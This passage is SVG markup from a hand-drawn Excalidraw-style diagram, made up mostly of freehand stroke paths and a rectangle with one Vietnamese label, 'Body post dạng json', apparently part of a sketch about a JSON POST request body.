<path d="M79.60 1614.08 L79.65 1612.78 L79.60 1611.71 L79.49 1610.70 L79.23 1611.65 L78.64 1614.08 L78.16 1616.22 L77.57 1618.48 L77.04 1620.68 L76.56 1622.70 L75.92 1625.73 L75.76 1626.68 L75.55 1627.87 L75.44 1628.99 L75.76 1629.89 L76.61 1630.24 L77.63 1630.36 L81.20 1630.30 L84.03 1629.94 L87.01 1629.59 L88.61 1629.35 L91.55 1628.93 L94.32 1628.58 L96.99 1628.22 L99.28 1627.92 L100.99 1627.69 L102.37 1627.57 L103.49 1627.45 L104.83 1627.27 L106.05 1627.15 L106.05 1627.15" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M107.97 1618.54 L107.60 1617.65 L108.03 1616.94 L109.04 1617.23 L109.68 1617.83 L110.43 1618.90 L110.75 1619.61 L111.28 1620.97 L111.49 1622.16 L111.12 1624.42 L110.69 1625.43 L109.47 1627.33 L107.65 1629.17 L105.15 1630.78 L102.53 1631.85 L102.53 1631.85" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<text x="132.35" y="1633.59" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="16" fill="#1e1e1e" text-anchor="start"><tspan x="132.35" dy="0">Body post dạng json</tspan></text>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M350.64 1678.04 L350.64 1676.85 L350.85 1678.28 L350.75 1681.49 L350.48 1686.53 L349.89 1693.43 L349.47 1697.35 L348.24 1707.03 L346.75 1717.96 L344.51 1734.47 L342.96 1744.39 L341.47 1753.90 L339.71 1763.76 L338.21 1772.31 L336.77 1780.39 L335.76 1785.62 L334.11 1793.58 L332.56 1800.94 L331.07 1807.95 L329.73 1814.66 L327.97 1823.04 L326.96 1828.09 L326.16 1832.36 L325.36 1836.05 L324.83 1839.31 L324.51 1840.62 L324.08 1843.06 L323.65 1845.08 L323.39 1846.50 L323.07 1847.57 L322.85 1848.76 L322.64 1849.59 L322.64 1849.59" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M355.92 1760.96 L356.51 1760.49 L358.64 1759.84 L360.56 1759.30 L362.53 1758.94 L363.55 1758.77 L365.25 1758.47 L366.59 1758.23 L367.71 1758.17 L367.71 1758.17" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M354.00 1766.01 L353.04 1766.25 L352.13 1766.49 L352.83 1766.01 L354.59 1765.36 L356.56 1764.77 L357.63 1764.47 L359.81 1763.82 L363.07 1763.16 L365.25 1762.81 L367.33 1762.39 L368.24 1762.27 L368.24 1762.27" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M374.11 1742.85 L374.00 1741.78 L373.84 1740.47 L374.00 1739.52 L375.07 1739.64 L376.13 1740.83 L376.72 1741.72 L377.52 1743.62 L377.84 1746.00 L377.95 1748.43 L377.41 1751.10 L376.51 1753.72 L375.07 1756.69 L373.20 1759.48 L371.07 1761.74 L369.89 1762.69 L369.89 1762.69" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M405.84 1746.77 L406.32 1746.05 L406.75 1745.28 L407.12 1744.27 L407.33 1743.14 L407.49 1741.90 L407.39 1740.71 L407.33 1739.52 L407.01 1738.45 L406.53 1737.74 L405.52 1737.62 L403.76 1739.76 L402.64 1741.84 L401.79 1744.27 L401.31 1746.83 L400.93 1749.44 L400.83 1751.94 L400.93 1754.31 L401.36 1756.45 L401.95 1758.41 L402.37 1759.30 L403.12 1760.55 L403.87 1761.38 L404.72 1761.86 L404.72 1761.86" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M416.67 1750.98 L416.08 1750.09 L415.44 1749.44 L414.64 1749.02 L413.63 1748.91 L412.83 1749.38 L411.76 1750.51 L410.96 1751.70 L410.48 1752.89 L410.27 1753.96 L410.21 1754.96 L410.27 1756.15 L410.64 1757.04 L411.12 1757.58 L412.19 1757.52 L413.25 1756.09 L414.00 1754.37 L414.21 1753.54 L414.59 1752.05 L414.85 1750.98 L415.07 1749.86 L414.64 1750.51 L414.48 1751.52 L414.59 1752.53 L414.80 1753.42 L415.12 1754.13 L415.92 1754.61 L416.93 1754.13 L418.59 1752.05 L419.07 1751.34 L419.49 1750.63 L420.13 1749.56 L420.56 1748.79 L421.09 1747.96 L421.25 1748.85 L421.09 1750.03 L421.09 1751.28 L421.15 1752.53 L421.15 1752.53" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M428.35 1727.22 L428.35 1726.16 L427.49 1728.41 L426.91 1731.15 L426.27 1734.77 L425.89 1736.67 L425.89 1736.67" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M437.15 1744.51 L436.72 1743.86 L436.19 1744.57 L435.33 1747.12 L434.80 1749.02 L434.59 1749.86 L434.27 1751.34 L434.05 1752.59 L433.89 1753.54 L433.79 1754.61 L434.48 1753.24 L435.12 1750.87 L435.87 1748.49 L436.67 1746.29 L437.41 1744.27 L438.37 1742.43 L439.23 1740.89 L439.92 1739.76 L440.56 1739.05 L441.31 1738.57 L442.00 1739.05 L442.21 1740.11 L442.43 1743.50 L442.43 1746.00 L442.37 1748.43 L442.37 1749.50 L442.37 1751.34 L442.43 1752.83 L442.43 1753.90 L442.64 1754.96 L443.65 1754.73 L444.61 1753.78 L445.25 1753.00 L446.48 1751.46 L447.60 1749.92 L448.67 1748.55 L449.47 1747.48 L450.11 1746.59 L450.53 1745.94 L450.96 1745.10 L450.53 1744.27 L449.04 1744.93 L446.53 1746.59 L444.93 1748.07 L443.60 1749.62 L442.53 1751.28 L442.11 1752.05 L441.73 1752.83 L441.31 1754.07 L441.31 1755.44 L441.79 1756.21 L442.75 1756.45 L445.25 1755.62 L446.75 1754.31 L448.13 1752.65 L449.31 1750.87 L450.32 1749.08 L450.75 1748.19 L451.39 1746.95 L451.87 1746.00 L452.13 1745.22 L451.55 1745.76 L451.28 1747.18 L450.96 1748.85 L450.85 1750.39 L450.75 1751.58 L450.96 1752.95 L451.33 1753.90 L452.19 1754.13 L452.93 1753.72 L454.27 1751.88 L455.07 1750.09 L455.65 1748.31 L456.08 1747.01 L456.35 1746.00 L456.45 1744.93 L455.87 1745.58 L455.65 1746.71 L455.49 1747.66 L455.65 1748.79 L455.97 1749.56 L457.09 1749.26 L458.59 1747.30 L459.44 1745.64 L460.08 1744.27 L460.51 1743.20 L460.88 1742.43 L461.25 1741.60 L461.15 1742.79 L460.83 1745.04 L459.81 1749.50 L459.01 1752.95 L458.21 1756.45 L457.36 1760.01 L456.45 1763.40 L455.49 1766.55 L455.07 1767.85 L454.21 1770.35 L453.36 1772.49 L452.51 1774.21 L451.55 1775.52 L450.75 1776.11 L449.57 1775.93 L448.56 1775.04 L447.39 1773.20 L446.96 1772.07 L446.32 1769.93 L446.11 1768.86 L446.16 1767.08 L447.23 1764.65 L448.67 1763.04 L450.69 1761.68 L453.20 1760.49 L456.13 1759.30 L458.85 1758.53 L461.52 1757.88 L463.81 1757.46 L464.88 1757.22 L464.88 1757.22" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M452.77 1724.61 L452.72 1723.66 L453.57 1723.19 L456.29 1724.14 L458.16 1725.38 L460.13 1727.05 L460.13 1727.05" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M491.33 1747.48 L491.07 1746.41 L490.48 1744.27 L489.79 1742.31 L488.99 1740.83 L487.97 1739.52 L486.91 1738.99 L485.73 1738.99 L484.40 1739.52 L483.55 1740.11 L481.95 1741.54 L480.67 1743.32 L479.65 1745.28 L478.80 1748.13 L478.75 1749.62 L478.96 1750.87 L479.39 1751.70 L480.08 1752.29 L481.47 1752.47 L483.60 1751.64 L485.84 1750.21 L488.03 1747.84 L489.09 1746.35 L489.09 1746.35" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M497.57 1723.01 L497.79 1722.12 L498.05 1720.93 L497.31 1722.71 L496.13 1726.99 L495.76 1728.65 L495.01 1732.39 L494.21 1736.31 L493.41 1740.23 L492.72 1744.21 L491.92 1747.84 L491.17 1751.16 L490.69 1753.72 L490.27 1755.86 L490.00 1756.69 L489.63 1757.82 L488.35 1756.33 L487.81 1753.78 L487.39 1751.10 L487.28 1748.49 L487.28 1747.42 L487.39 1745.70 L487.71 1744.51 L488.19 1743.56 L488.83 1743.08 L489.89 1742.85 L492.08 1743.32 L493.95 1743.92 L494.80 1744.21 L496.13 1744.69 L497.31 1745.10 L498.32 1745.52 L499.49 1745.70 L500.45 1745.52 L501.15 1744.87 L501.57 1743.98 L501.79 1742.97 L501.73 1741.72 L501.47 1740.83 L500.61 1741.07 L500.24 1741.78 L500.08 1742.85 L500.35 1744.69 L500.88 1746.71 L501.52 1748.49 L501.89 1749.20 L502.59 1750.27 L503.23 1750.93 L503.23 1750.93" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M508.24 1729.30 L508.77 1728.65 L509.57 1728.95 L510.32 1729.42 L510.32 1729.42" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M517.95 1722.00 L517.57 1723.48 L517.15 1724.37 L517.15 1724.37" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M487.76 1727.34 L486.80 1726.93 L488.67 1725.86 L491.12 1725.56 L494.05 1725.44 L497.41 1725.44 L501.09 1725.62 L501.09 1725.62" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M528.13 1720.63 L528.35 1719.56 L527.60 1719.98 L526.69 1722.47 L525.84 1724.91 L524.99 1727.82 L524.51 1729.07 L523.81 1731.86 L523.23 1734.77 L522.75 1737.38 L522.37 1739.82 L522.11 1741.84 L521.95 1743.26 L521.79 1744.39 L521.95 1745.40 L522.59 1745.94 L523.76 1745.76 L523.76 1745.76" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M536.29 1739.46 L536.51 1738.63 L536.45 1737.56 L535.87 1736.73 L534.80 1736.55 L532.83 1737.26 L531.07 1738.27 L529.57 1739.40 L528.40 1740.77 L527.92 1741.48 L527.33 1742.67 L527.12 1743.80 L527.28 1745.04 L527.76 1745.94 L528.56 1746.35 L529.79 1746.29 L531.87 1744.93 L533.04 1743.56 L534.16 1742.07 L534.85 1740.83 L535.33 1739.88 L535.76 1738.99 L534.80 1739.40 L534.48 1740.35 L534.37 1741.42 L534.37 1742.55 L534.48 1743.56 L534.85 1744.39 L535.44 1744.99 L536.56 1744.87 L537.73 1744.27 L539.28 1742.97 L540.67 1741.48 L542.32 1739.40 L543.01 1738.45 L543.55 1737.74 L544.03 1737.20 L543.87 1738.27 L543.60 1739.28 L543.33 1740.71 L543.01 1742.25 L542.75 1743.62 L542.59 1744.63 L542.53 1745.76 L542.91 1746.59 L543.76 1746.11 L544.83 1744.75 L545.89 1742.97 L546.37 1741.96 L547.55 1740.17 L549.04 1737.98 L549.84 1737.03 L550.64 1736.55 L551.55 1736.67 L551.71 1737.80 L551.71 1738.99 L551.55 1740.11 L551.49 1741.18 L551.33 1742.25 L551.33 1743.44 L552.19 1743.20 L553.20 1741.60 L554.21 1740.17 L555.28 1738.93 L556.13 1738.04 L556.93 1737.38 L557.57 1736.97 L558.53 1736.85 L559.28 1737.09 L560.03 1737.92 L560.40 1738.63 L560.61 1739.52 L560.61 1740.89 L559.44 1742.97 L559.44 1742.97" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M539.23 1718.79 L540.83 1718.97 L543.55 1719.86 L548.61 1722.06 L552.51 1724.20 L552.51 1724.20" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M584.51 1742.07 L584.40 1741.01 L583.97 1740.23 L583.23 1739.76 L582.16 1739.52 L580.88 1740.17 L580.13 1740.53 L578.96 1741.54 L577.84 1742.79 L577.15 1743.98 L576.77 1745.04 L576.67 1746.00 L576.67 1747.06 L577.09 1747.78 L577.95 1748.01 L578.80 1747.72 L580.67 1746.29 L581.95 1744.63 L582.96 1742.85 L583.65 1740.83 L584.19 1739.05 L584.51 1737.68 L584.83 1736.67 L585.04 1735.60 L584.67 1736.67 L584.61 1738.39 L584.45 1741.12 L584.29 1744.04 L584.08 1747.06 L583.81 1750.03 L583.39 1752.89 L582.75 1756.75 L582.16 1759.06 L581.52 1761.02 L581.15 1761.91 L580.83 1762.63 L580.13 1763.70 L579.44 1764.35 L578.43 1764.47 L577.57 1764.05 L576.99 1763.16 L576.88 1762.09 L577.31 1760.55 L578.11 1758.59 L579.28 1756.75 L580.83 1754.96 L582.53 1753.18 L584.29 1751.58 L586.11 1750.03 L587.76 1748.55 L589.25 1747.18 L589.89 1746.59 L590.53 1746.00 L591.49 1745.04 L592.72 1743.80 L593.25 1743.14 L593.15 1744.27 L592.93 1745.34 L592.77 1746.47 L592.61 1747.54 L592.61 1747.54" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M595.07 1736.31 L594.85 1735.48 L594.85 1735.48" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M597.31 1725.38 L597.41 1724.08 L598.16 1723.72 L600.45 1724.14 L603.87 1725.44 L605.25 1726.10 L606.32 1726.57 L606.32 1726.57" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M625.95 1735.48 L626.05 1734.29 L626.32 1731.86 L626.85 1729.72 L627.55 1727.82 L628.83 1725.44 L629.84 1724.55 L630.85 1724.14 L632.13 1724.20 L633.15 1724.85 L634.27 1726.81 L634.69 1728.65 L634.64 1730.31 L634.21 1732.51 L633.41 1734.65 L632.29 1736.73 L630.91 1738.69 L629.36 1740.47 L627.55 1741.84 L625.63 1743.08 L623.81 1743.98 L623.81 1743.98" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M614.85 1763.28 L614.48 1763.99 L614.16 1764.83 L614.05 1765.84 L614.05 1765.84" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M307.81 1937.80 L308.03 1936.91 L308.03 1939.11 L307.65 1942.26 L307.17 1946.47 L306.32 1952.06 L305.15 1959.19 L304.51 1962.99 L303.07 1970.77 L301.36 1980.04 L299.71 1988.23 L298.05 1995.84 L295.65 2007.12 L294.00 2014.19 L292.24 2021.08 L290.53 2027.44 L288.88 2032.90 L287.23 2037.89 L285.68 2042.41 L284.93 2044.37 L283.60 2047.87 L282.21 2051.20 L281.57 2052.68 L279.71 2056.43 L278.64 2058.33 L277.20 2060.82 L276.72 2061.47 L275.97 2062.66 L275.33 2063.49 L274.69 2064.21 L274.11 2064.86 L273.47 2065.45 L272.93 2065.99 L271.76 2067.18 L270.69 2067.95 L269.84 2068.54 L269.04 2069.02 L268.35 2069.37 L267.17 2069.32 L267.17 2069.32" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M322.37 1955.86 L321.89 1956.45 L321.68 1957.28 L321.25 1959.72 L320.56 1963.11 L319.71 1967.74 L318.05 1976.89 L317.41 1980.39 L315.97 1987.76 L314.43 1995.36 L312.83 2003.08 L311.28 2010.81 L309.73 2018.23 L308.24 2025.30 L306.75 2032.13 L305.36 2037.77 L304.03 2043.30 L303.44 2045.97 L301.57 2053.16 L300.51 2057.08 L299.65 2060.46 L298.80 2063.38 L298.16 2065.69 L297.57 2067.71 L297.31 2068.54 L296.93 2069.73 L296.56 2070.74 L296.29 2071.81 L295.92 2072.76 L295.92 2072.76" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M331.92 2006.88 L331.81 2005.82 L332.40 2005.22 L334.48 2004.09 L336.72 2003.14 L339.17 2002.43 L340.35 2002.07 L342.85 2001.54 L346.27 2000.89 L347.92 2000.65 L349.09 2000.53 L349.09 2000.53" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M335.28 2006.23 L334.43 2006.53 L335.33 2006.94 L338.64 2006.94 L341.09 2006.77 L342.21 2006.65 L344.51 2006.29 L346.59 2005.93 L347.44 2005.76 L348.88 2005.34 L350.11 2004.75 L350.11 2004.75" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M354.64 1987.40 L355.44 1988.00 L355.92 1988.53 L356.88 1989.54 L357.95 1991.08 L358.85 1992.69 L359.49 1994.35 L359.65 1996.01 L359.17 1999.16 L358.16 2001.60 L356.77 2004.21 L353.84 2008.19 L351.49 2010.45 L351.49 2010.45" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M392.72 1983.66 L392.77 1982.59 L392.56 1983.60 L392.40 1986.45 L392.13 1989.06 L391.92 1991.68 L391.71 1994.35 L391.39 1996.91 L391.28 1999.34 L391.17 2000.35 L391.12 2002.01 L391.12 2003.32 L391.07 2004.69 L391.07 2004.69" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M382.80 1983.12 L382.43 1982.41 L382.11 1981.52 L381.68 1980.75 L381.31 1980.04 L380.88 1979.32 L380.45 1978.67 L379.92 1978.08 L379.92 1978.08" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M400.08 1982.17 L399.60 1981.52 L399.60 1980.39 L399.44 1979.20 L399.01 1978.43 L398.21 1978.08 L397.31 1978.37 L396.35 1979.09 L395.12 1980.57 L394.05 1982.29 L393.20 1984.37 L392.40 1986.69 L391.92 1989.24 L391.39 1991.92 L391.07 1994.47 L390.85 1998.21 L390.91 2000.17 L390.91 2001.66 L391.12 2002.90 L391.39 2003.68 L392.08 2004.39 L392.93 2004.57 L393.89 2004.33 L394.91 2004.03 L396.56 2003.14 L398.21 2002.13 L399.65 2001.18 L400.83 2000.29 L401.68 1999.52 L402.32 1998.81 L402.96 1998.03 L403.39 1997.26 L402.43 1997.80 L401.52 1999.34 L400.72 2000.89 L400.35 2002.07 L400.24 2003.14 L400.35 2004.33 L400.93 2005.04 L402.11 2005.16 L403.01 2004.81 L404.61 2003.44 L405.25 2002.73 L406.16 2001.18 L406.80 1999.82 L407.17 1998.75 L407.33 1997.80 L407.17 1996.85 L406.53 1996.19 L406.53 1996.19" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M408.03 1987.76 L409.04 1987.64 L409.89 1988.05 L410.64 1988.59 L410.96 1989.54 L410.85 1990.85 L410.00 1992.57 L408.99 1994.11 L408.24 1994.83 L408.24 1994.83" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M422.64 1994.77 L423.55 1992.75 L423.65 1991.86 L423.65 1990.67 L423.01 1990.25 L422.32 1990.67 L419.07 1995.78 L418.21 1997.74 L417.73 1999.52 L417.57 2000.83 L417.57 2001.90 L418.05 2002.73 L419.07 2002.79 L420.35 2002.31 L422.21 2000.94 L424.29 1998.93 L426.27 1996.37 L427.92 1993.28 L428.67 1991.68 L430.05 1988.35 L431.28 1985.03 L432.13 1982.17 L432.72 1979.86 L433.20 1978.02 L433.41 1976.65 L433.25 1975.52 L432.13 1975.58 L430.96 1977.12 L429.84 1979.20 L428.67 1982.06 L427.71 1985.20 L426.75 1988.47 L425.89 1993.04 L425.47 1995.78 L425.41 1997.02 L425.31 1998.09 L425.41 1999.82 L425.47 2001.18 L425.73 2002.07 L426.48 2002.73 L427.39 2002.55 L429.04 2001.18 L429.68 2000.53 L430.96 1998.98 L432.61 1997.08 L433.36 1996.19 L433.84 1995.48 L434.43 1994.77 L434.43 1996.01 L434.21 1997.14 L434.05 1998.39 L434.21 1999.58 L434.85 2001.24 L435.71 2002.31 L436.67 2002.90 L438.05 2002.90 L439.81 2002.01 L441.09 2000.83 L442.21 1999.34 L443.12 1997.86 L443.65 1996.67 L443.97 1995.60 L444.19 1994.41 L443.65 1993.64 L442.64 1993.76 L441.95 1994.29 L441.31 1994.95 L440.45 1996.31 L439.65 1998.27 L439.49 1999.46 L439.65 2000.35 L439.87 2001.24 L440.35 2001.90 L440.93 2002.43 L441.57 2002.90 L442.59 2003.26 L443.76 2003.32 L446.11 2002.61 L446.11 2002.61" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M445.89 1987.46 L445.41 1986.69 L445.63 1985.74 L446.05 1985.03 L446.53 1984.31 L447.17 1983.54 L447.71 1982.95 L448.77 1983.01 L449.25 1983.66 L449.68 1984.37 L450.27 1985.08 L450.85 1985.80 L451.49 1986.33 L451.49 1986.33" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M459.81 1971.13 L459.87 1970.12 L458.75 1971.66 L458.00 1973.92 L457.41 1976.59 L457.41 1976.59" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M463.87 1997.50 L463.97 1996.13 L463.97 1995.06 L463.65 1994.29 L463.12 1993.64 L461.95 1993.64 L460.51 1995.66 L459.71 1997.26 L459.49 1998.15 L459.28 1999.58 L459.39 2000.94 L459.71 2001.95 L460.83 2003.44 L461.52 2003.80 L462.75 2003.97 L464.40 2003.68 L466.48 2002.73 L468.45 2001.60 L470.21 2000.05 L471.76 1998.45 L473.04 1997.02 L474.00 1995.66 L474.59 1994.65 L474.80 1993.52 L474.37 1992.87 L473.36 1992.63 L471.33 1993.99 L470.64 1994.65 L469.25 1996.31 L468.24 1998.15 L467.55 2000.05 L467.01 2001.95 L467.01 2003.44 L467.12 2004.69 L467.39 2005.58 L467.81 2006.23 L468.45 2006.65 L469.57 2006.83 L471.28 2006.23 L472.93 2005.10 L474.43 2003.50 L475.71 2001.72 L477.09 1998.93 L477.41 1998.15 L477.95 1996.91 L478.27 1996.01 L478.21 1995.00 L477.73 1995.78 L477.57 1996.91 L477.63 1998.09 L478.16 2000.17 L478.53 2001.00 L479.17 2002.25 L479.87 2003.08 L480.61 2003.62 L481.68 2003.68 L482.64 2003.26 L483.17 2002.67 L484.29 2001.30 L485.31 1999.34 L485.68 1998.45 L486.05 1997.44 L485.31 1998.03 L485.09 1999.22 L485.04 2000.35 L485.31 2001.24 L485.31 2001.24" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M493.68 1976.06 L492.72 1976.35 L491.39 1978.31 L490.53 1980.69 L489.57 1985.38 L489.31 1986.99 L489.31 1986.99" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M502.80 1998.09 L502.64 1997.02 L502.59 1995.84 L502.43 1996.91 L502.53 1998.09 L502.64 1999.34 L502.91 2000.53 L503.17 2001.60 L503.39 2002.43 L503.87 2003.02 L504.61 2002.61 L505.84 2000.47 L506.59 1998.57 L507.33 1996.73 L507.97 1995.06 L508.77 1993.04 L509.25 1992.21 L510.32 1992.51 L510.69 1993.58 L511.33 1995.66 L511.92 1998.03 L512.29 1999.28 L512.72 2000.35 L513.04 2001.24 L513.57 2001.95 L513.57 2001.95" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M522.59 1999.22 L522.53 1998.03 L522.00 1997.08 L521.31 1996.43 L520.35 1996.13 L519.39 1996.19 L518.00 1996.91 L517.31 1997.38 L516.29 1998.15 L515.55 1998.98 L515.07 1999.82 L514.80 2000.89 L515.07 2001.66 L515.71 2002.13 L516.67 2002.31 L518.59 2001.90 L520.13 2000.94 L520.88 2000.35 L522.32 1998.51 L522.80 1997.20 L523.12 1996.19 L523.17 1995.12 L522.75 1994.29 L521.95 1994.65 L521.68 1995.60 L521.73 1996.73 L522.00 1997.56 L522.43 1998.27 L523.12 1998.81 L524.08 1998.93 L524.88 1998.63 L526.11 1997.62 L526.96 1996.49 L527.55 1995.66 L527.97 1995.00 L528.19 1996.01 L528.19 1997.38 L528.40 1998.45 L528.83 1999.34 L529.47 1999.99 L530.32 2000.35 L531.55 2000.23 L532.99 1999.16 L534.05 1997.86 L534.69 1996.85 L535.23 1996.07 L535.65 1995.18 L535.76 1996.37 L535.92 1999.88 L535.92 2002.55 L535.92 2005.34 L535.76 2008.13 L535.55 2010.81 L535.28 2013.42 L534.91 2015.85 L534.43 2018.05 L534.16 2019.06 L533.41 2020.73 L532.13 2022.27 L531.17 2022.74 L528.99 2022.15 L527.60 2021.08 L527.12 2020.43 L526.37 2019.42 L526.11 2018.41 L526.32 2017.16 L526.75 2016.45 L529.25 2014.25 L531.07 2013.24 L532.93 2012.53 L534.85 2011.82 L536.45 2011.40 L537.73 2010.98 L537.73 2010.98" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M521.47 1976.23 L520.51 1975.34 L521.79 1975.46 L524.03 1976.95 L526.75 1979.03 L529.68 1981.52 L529.68 1981.52" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M560.93 1988.41 L560.51 1986.93 L560.13 1985.80 L560.08 1984.67 L560.45 1983.90 L561.31 1983.66 L562.11 1984.19 L562.53 1985.03 L562.75 1986.09 L562.37 1989.01 L561.68 1991.26 L560.61 1993.40 L559.39 1995.42 L558.75 1996.31 L558.75 1996.31" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M551.65 2012.53 L551.07 2013.06 L550.43 2013.60 L550.43 2013.60" stroke="#1e1e1e" stroke-width="0.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
<path d="M-362.13 2080.84 C-297.35 2079.93,-232.66 2080.50,-126.54 2081.19 M-363.27 2080.18 C-292.28 2078.44,-223.21 2078.10,-125.40 2080.18 M-124.14 2078.62 C-125.94 2103.82,-124.92 2127.66,-126.31 2148.02 M-124.67 2080.31 C-125.61 2099.03,-126.45 2117.21,-124.93 2147.43 M-126.11 2148.46 C-190.35 2145.74,-252.72 2147.02,-363.14 2147.49 M-124.80 2147.60 C-191.57 2147.98,-259.08 2147.83,-363.17 2147.13 M-363.15 2146.47 C-362.11 2121.05,-365.01 2098.78,-363.22 2081.72 M-363.88 2146.06 C-363.27 2121.57,-362.85 2095.09,-363.41 2080.20" stroke="#1e1e1e" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(422.95,-746.87)">
